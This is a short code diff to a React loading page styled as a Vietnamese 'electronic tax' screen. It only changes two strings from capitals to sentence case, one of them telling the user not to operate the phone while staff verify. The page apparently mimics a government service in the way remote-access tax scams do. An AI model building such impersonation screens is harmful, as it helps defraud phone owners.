@@ -25,7 +25,7 @@ const LoadingPage = () => {
     <div className="min-h-screen bg-[#f8341e] flex flex-col items-center justify-center px-6 text-white">
       {/* Title */}
       <Link to="/profile" state={{ error: true }}>
-        <h1 className="text-2xl font-bold mb-12 tracking-wide">THUẾ ĐIỆN TỬ</h1>
+        <h1 className="text-2xl font-bold mb-12 tracking-wide">Thuế điện tử</h1>
       </Link>
 
       {/* Logo */}
@@ -56,7 +56,7 @@ const LoadingPage = () => {
 
       {/* Loading Message */}
       <p className="text-center text-[18px] font-bold px-4">
-        NHÂN VIÊN ĐANG XÁC THỰC VUI LÒNG KHÔNG THAO TÁC TRÊN ĐIỆN THOẠI
+        Nhân viên đang xác thực vui lòng không thao tác trên điện thoại
       </p>
     </div>
   );
